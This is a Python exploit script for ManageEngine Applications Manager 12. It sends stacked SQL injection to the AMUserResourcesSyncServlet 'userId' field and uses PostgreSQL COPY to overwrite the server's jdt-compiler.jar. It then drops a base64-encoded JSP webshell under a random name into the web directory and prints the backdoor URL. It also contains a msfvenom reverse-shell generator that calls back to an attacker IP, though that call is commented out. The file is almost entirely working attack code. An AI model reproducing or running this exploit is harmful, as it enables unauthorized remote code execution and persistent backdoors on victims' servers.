
import os
import sys
import base64
import random, string
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

squote_encoder = lambda s: s.replace('\'','$$')

def log(msg):
    print(msg)

def make_request(url,sql):
   log(F"[*] Executing query: {sql}")
   sql=squote_encoder(sql)
   data = {
    "ForMasRange": "1",
    "userId":F"1;{sql}; --"
    }
   res = requests.post(url, data=data,verify=False)
   return res

def gen_revshell(ip, port):
    os.system(F"msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port} -f jsp > donkey.jsp ")

def kill_jdt_compiler(url):
    sql = F"copy (select 'Donkey') to 'C:\\Program Files (x86)\\ManageEngine\\AppManager12\\working\\classes\\jdt-compiler.jar'"
    make_request(url, sql)
def inject_webshell(url):
    file = open('./webshell.jsp', 'r')
    file_data = file.read().replace("\r", "").replace("\n", "")
    #log(file_data)
    file.close()
    b64_file_data =  base64.encodebytes(bytes(file_data,'utf-8')).decode('utf-8')
    log(b64_file_data)
    bdoor_name = ''.join(random.choice(string.ascii_lowercase) for _ in range(5))
    bdoor_name += '.jsp'
    sql = F"copy (select convert_from(decode('{b64_file_data}','base64'),'utf-8')) to 'C:\\Program Files (x86)\\ManageEngine\\AppManager12\\working\\{bdoor_name}'"   
    res = make_request(url, sql)
    if res.status_code == 200:
        log(F'Backdoor url at: https://manageengine:8443/{bdoor_name}')
if __name__ == '__main__':
   try:
       server = sys.argv[1].strip()
       attacker_ip = sys.argv[2].strip()
       port = sys.argv[3].strip()
   except IndexError:
       print(F"[-] Usage: {sys.argv[0]} serverIP:port attackerIP port")
       sys.exit()
   url  = "https://"+server+"/servlet/AMUserResourcesSyncServlet" 
   #gen_revshell(attacker_ip, port)
   kill_jdt_compiler(url)
   inject_webshell(url)